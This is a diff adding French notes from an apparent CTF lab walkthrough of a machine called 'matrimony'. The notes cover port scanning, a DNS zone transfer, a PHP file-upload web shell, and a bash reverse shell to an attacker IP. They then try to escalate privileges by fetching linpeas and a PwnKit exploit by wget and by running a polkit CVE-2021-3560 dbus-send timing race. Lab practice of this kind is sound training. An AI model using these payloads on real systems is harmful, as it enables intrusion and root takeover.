@@ -1,1 +1,231 @@
+nmap -sV 192.168.59.196
 
+22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.4 (Ubuntu Linux; protocol 2.0)
+53/tcp open  domain  ISC BIND 9.16.1 (Ubuntu Linux)
+80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+http://192.168.59.196:80
+
+Vanilla Boostrap v4.2.1
+
+Formulaire contact
+
+dirsearch -u http://192.168.59.196:80
+
+[09:55:16] 301 -  313B  - /js  ->  http://192.168.59.196/js/                
+[09:55:18] 403 -  279B  - /.php                                             
+[09:55:27] 301 -  314B  - /css  ->  http://192.168.59.196/css/              
+[09:55:29] 301 -  316B  - /fonts  ->  http://192.168.59.196/fonts/          
+[09:55:30] 301 -  314B  - /img  ->  http://192.168.59.196/img/              
+[09:55:30] 200 -  504B  - /js/                                
+
+apt -y install seclists
+
+gobuster dir -u http://192.168.59.196:80/ -w seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-small.txt 
+
+open bursuite et tester de catch le formulaire
+
+POST / HTTP/1.1
+Host: 192.168.59.196
+Content-Length: 45
+Cache-Control: max-age=0
+Accept-Language: en-US,en;q=0.9
+Origin: http://192.168.59.196
+Content-Type: application/x-www-form-urlencoded
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Referer: http://192.168.59.196/
+Accept-Encoding: gzip, deflate, br
+Connection: keep-alive
+
+name=test&email=test%40gmail.com&message=test
+
+Réponse 200 et retour menu
+
+Cherchons une RCE avec une page de contact avec Boostrap v4.2.1
+
+On trouve une XSS mais rien de concluant.
+
+regardons le port 53
+
+le serveur DNS tourne sur le port 53 via BIND
+
+dig (outil pour interroger le serveur DNS)
+dig -h 
+
+on a besoin du domaine donc on va réaliser un reverse lookups
+-x dot-notation     (shortcut for reverse lookups)
+
+dig @192.168.59.196 -x 192.168.59.196
+
+ <<>> DiG 9.20.4-4-Debian <<>> @192.168.59.196 -x 192.168.59.196
+; (1 server found)
+;; global options: +cmd
+;; Got answer:
+;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 27857
+;; flags: qr aa rd; QUERY: 1, ANSWER: 1, AUTHORITY: 0, ADDITIONAL: 1
+;; WARNING: recursion requested but not available
+
+;; OPT PSEUDOSECTION:
+; EDNS: version: 0, flags:; udp: 4096
+; COOKIE: 6e590879fe5125de01000000695257d1c612df7ca0fe9aed (good)
+;; QUESTION SECTION:
+;196.59.168.192.in-addr.arpa.   IN      PTR
+
+;; ANSWER SECTION:
+196.59.168.192.in-addr.arpa. 604800 IN  PTR     matrimony.off.
+
+;; Query time: 16 msec
+;; SERVER: 192.168.59.196#53(192.168.59.196) (UDP)
+;; WHEN: Mon Dec 29 10:28:31 UTC 2025
+;; MSG SIZE  rcvd: 111
+
+196.59.168.192.in-addr.arpa. 604800 IN  PTR     matrimony.off.
+
+le reverse DNS pointe vers le nom matrimony.off
+
+Ensuite, le test « gold » en CTF DNS, c’est le transfert de zone. Tu essayes de récupérer toute la zone matrimony.off d’un coup :
+
+dig @192.168.59.196 matrimony.off axfr
+
+ <<>> DiG 9.20.4-4-Debian <<>> @192.168.59.196 matrimony.off axfr
+; (1 server found)
+;; global options: +cmd
+matrimony.off.          604800  IN      SOA     matrimony.off. root.matrimony.off. 4 604800 86400 2419200 604800
+matrimony.off.          604800  IN      NS      matrimony.off.
+matrimony.off.          604800  IN      A       127.0.0.1
+matrimony.off.          604800  IN      AAAA    ::1
+prod99.matrimony.off.   604800  IN      CNAME   matrimony.off.
+matrimony.off.          604800  IN      SOA     matrimony.off. root.matrimony.off. 4 604800 86400 2419200 604800
+;; Query time: 4 msec
+;; SERVER: 192.168.59.196#53(192.168.59.196) (TCP)
+;; WHEN: Mon Dec 29 13:27:15 UTC 2025
+;; XFR size: 6 records (messages 1, bytes 226)
+
+nano /etc/hosts
+192.168.59.19 prod99.matrimony.off
+
+http://prod99.matrimony.off
+Copyright © 2017 Marital . All Rights Reserved | Design by projectworlds
+
+Rechercher RCE marital Project world 
+https://www.exploit-db.com/exploits/49183
+
+To exploit this vulnerability:
+# 1) register a not privileged user at /register.php
+# 2) login in the application /login.php
+# 3) keep note of the redirect with the GET 'id' parameter  /userhome.php?id=[ID]
+http://prod99.matrimony.off/userhome.php?id=17
+
+# 4) go to the page /photouploader.php?id=[ID]
+http://prod99.matrimony.off/photouploader.php?id=[17]
+
+# 5) upload an arbitrary file in the upload form, in my example, I used a file called shell.php with the content of "<?php system($_GET['cmd']); ?>"
+
+Incorrect integer value: '' for column 'id' at row 1Sorry, there was a problem uploading your file.
+
+# 6) An error will occurr, but the file is correctly uploaded at /profile/[ID]/shell.php
+http://prod99.matrimony.off/profile/[17]/shell.php
+
+# 7) run command system command through /profile/[ID]/shell.php?cmd=[COMMAND]
+http://prod99.matrimony.off/profile/[17]/shell.php?cmd=[bash -c "bash -i >& /dev/tcp/192.168.49.59/443 0>&1"]
+
+
+username : testtest 
+pwd : test
+test@gmail.com
+# How to use it:
+# python2 exploit.py http://prod99.matrimony.off/ testtest test
+
+(le lancer avec python2 sinon les () ne sont pas bien prise en compte)
+$ whoami
+sam
+
+je lance mon bash -c "bash -i >& /dev/tcp/192.168.49.59/443 0>&1" ici
+??# nc -lvnp 443
+listening on [any] 443 ...
+^C
+
+sam@matrimony:/var/www/matrimony/profile/17$
+
+sam@matrimony:/home/sam$ cat local.txt
+cat local.txt
+7c6bc083b6962dc2d2fc18542f6a172e
+
+wget https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh
+
+ok ça ne fonctionne pas, on va ouvrir un mini serveur pour mettre linpeas dessus
+
+sur ma machine : 
+[/var/www/html]
+# sudo systemctl enable --now apache2
+systemctl status apache2
+
+sur la machine cible /tmp
+wget http://192.168.49.59/linpeas.sh
+
+ 'linpeas.sh' saved [975444/975444]
+chmod +x linpeas.sh
+./linpeas.sh
+Nous voyons PwnKit,
+
+on va checker la vuln
+
+Sur ma machine , je dl https://raw.githubusercontent.com/joeammond/CVE-2021-4034/refs/heads/main/CVE-2021-4034.py
+
+sur la machine cible : wget http://192.168.49.59/CVE-2021-4034.py 
+python3 CVE-2021-4034.py
+sam@matrimony:/tmp$ python CVE-2021-4034.py
+python CVE-2021-4034.py
+Command 'python' not found, did you mean:
+  command 'python3' from deb python3
+  command 'python' from deb python-is-python3
+
+on voit aussi
+Vulnerable to CVE-2021-3560
+Polkit : polkit est un service système installé par défaut sur de nombreuses distributions Linux. Il est utilisé par systemd, donc toute distribution Linux qui utilise systemd utilise également du polkit.
+La vulnérabilité permet à un utilisateur local non privilégié d'obtenir un shell root sur le système
+
+On va créer un nouvel utilisateur, l'objectif est d'envoyer une requete D bus pour une action sensible et jouer sur le timing en annulant ou interrompant la requete au moment où le polkit fait la vérification. Le service devrait executer l'action comme si elle avait été autorisée sans controle.
+dbus-send --system --dest=org.freedesktop.Accounts --type=method_call --print-reply /org/freedesktop/Accounts org.freedesktop.Accounts.CreateUser string:CTF string:"test vulns" int32:1
+
+ici CTF est notre nouvel user
+
+Cette commande va envoyer au dbus un message de compte daemon  nouvel utilisateur appelé CTF(string :CTF), avec une description de « test vulns » (chaîne : « test vulns ») et l’appartenance au groupe Sudo réglée sur true (référencée par l’int32:1).
+Comme le timing est compté, nous devons déterminer combien de temps prendra notre commande
+
+time dbus-send --system --dest=org.freedesktop.Accounts --type=method_call --print-reply /org/freedesktop/Accounts org.freedesktop.Accounts.CreateUser string:CTF string:"test vulns" int32:1
+real    0m0.006s                                                                                                                                                                                                                            
+user    0m0.001s                                                                                                                                                                                                                            
+sys     0m0.000s       
+
+: le PoC va lancer la même requête D‑Bus que celle que tu viens de faire, mais au lieu de la laisser aller jusqu’au bout, il va l’arrêter ou la faire expirer au bon moment (très légèrement avant ou après un certain délai). C’est ce timing précis qui déclenche la race condition dans polkit, et qui fait que l’action finit par passer sans authentification.
+
+Cela prendre 0.006s, on va essayé d'interrompe à mis temps, on va prendre 0.003s
+
+dbus-send --system --dest=org.freedesktop.Accounts --type=method_call --print-reply /org/freedesktop/Accounts org.freedesktop.Accounts.CreateUser string:CTF string:"test vulns" int32:1 & sleep 0.003s; kill $!
+<string:"test vulns" int32:1 & sleep 0.003s; kill $! 
+
+il dort à 0.003s et de couper le processus précédent, cela a permis de créer le nouvel utilisateur CTF, en l'ajoutant au groupe sudo, l'identifiant de l'utilisateur est de 1000
+
+Nous avons besoin d'un hachage de mot de passe, (banane)
+
+sam@matrimony:/tmp$ openssl passwd -6 banana
+openssl passwd -6 banana
+$6$i1kI1znK3dqWe/jx$KMg/GtuLprV68UDuXmPYH8hKBox0E7NvgrczNysFLfDQHkYLNI22TRBk3DQAQ0.ctH7SJoUwGxiCXL0.2.UVS/
+
+On inclu le mot de passe (banane) dans l'id 1005 créé
+dbus-send --system --dest=org.freedesktop.Accounts --type=method_call --print-reply /org/freedesktop/Accounts/User1000 org.freedesktop.Accounts.User.SetPassword string:'$6$i1kI1znK3dqWe/jx$KMg/GtuLprV68UDuXmPYH8hKBox0E7NvgrczNysFLfDQHkYLNI22TRBk3DQAQ0.ctH7SJoUwGxiCXL0.2.UVS/' string:'test vulns' & sleep 0.003s; kill $!
+
+<2.UVS/' string:'test vulns' & sleep 0.003s; kill $!                                                                                                                                                                                      
+[2] 71450 
+
+sam@matrimony:/home$ su CTF                                                                                                                                                                                                               
+su CTF                                                                                                                                                                                                                                    
+su: user CTF does not exist  
+
+ok ça ne fonctionne pas, ok fausse piste.
+
+On voit dans /var/run que la machine tourne sous docker
